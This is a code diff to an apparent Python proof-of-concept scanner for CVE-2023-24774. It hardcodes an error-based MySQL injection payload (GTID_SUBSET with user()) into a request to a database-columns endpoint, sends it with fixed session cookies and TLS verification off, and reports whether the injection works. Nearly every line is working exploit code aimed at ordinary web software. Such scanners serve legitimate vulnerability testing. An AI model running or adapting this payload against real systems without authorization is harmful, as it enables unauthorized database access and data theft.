@@ -28,7 +28,7 @@ def common_headers(profile_url):
 
 def scan_cve_2023_24774(profile_url):
     headers = common_headers(profile_url)
-    profile_url = f"{profile_url}/databases/table/columns?id='"
+    profile_url = f"{profile_url}/databases/table/columns?id="
 
     cookies = {
         'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
@@ -36,19 +36,23 @@ def scan_cve_2023_24774(profile_url):
         'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51',
     }
 
-    sqli = input("Input SQLi: ")
-    if not sqli:
-        sqli = "+AND+GTID_SUBSET(CONCAT(0x12,(SELECT+(ELT(6415=6415,1))),user()),6415)--+qRTY"
-    else:
-        sqli = sqli.replace(' ', '+')
+    sqli = "+AND+GTID_SUBSET(CONCAT(0x12,(SELECT+(ELT(6415=6415,1))),user()),6415)--+qRTY"
 
     profile_url += f"{sqli}--+qRTY"
     print(f"Request target: {profile_url}")
 
-    sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
-    print(sqli_request.text)
+    try:
+        sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
+        print(sqli_request.text)
 
-    if 'message' in sqli_request.text:
-        print('**POC CVE-2023-24774: SQLi works** :)')
-    else:
-        print('**POC CVE-2023-24774: SQLi does not work** :(')
+        if 'message' in sqli_request.text:
+            print('**POC CVE-2023-24774: SQLi works** :)')
+            return True 
+        else:
+            print('**POC CVE-2023-24774: SQLi does not work** :(')
+            return False  
+
+    except Exception as e:
+        print(f"[ERROR] An exception occurred: {str(e)}")
+        return False 
+
